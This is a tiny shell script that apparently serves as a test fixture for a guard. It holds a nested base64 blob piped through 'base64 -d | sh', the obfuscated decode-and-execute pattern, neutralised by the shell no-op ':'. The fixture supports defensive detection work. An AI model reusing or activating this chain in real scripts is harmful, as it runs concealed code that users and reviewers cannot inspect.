#!/bin/sh
# A harmless replica for the guard's tests (#69): assignments are plain
# strings and every command is the shell's no-op `:`, so nothing is read,
# packed, decoded or sent if it is ever run.
: echo ZWNobyBaV05vYnlCYVYwNXZZbmxDV2sxcldYZFRWV2N3Wkd0NGRWUnVjR2hSZW14M1YydFpOV0pHY0VWVFZFWlBWa1ZWTVVsSWQyZFpiVVo2V2xSWk1FbERNV3RKU0hkbll6Sm5QU0I4SUdKaGMyVTJOQ0F0WkNCOElITm8gfCBiYXNlNjQgLWQgfCBzaA== | base64 -d | sh
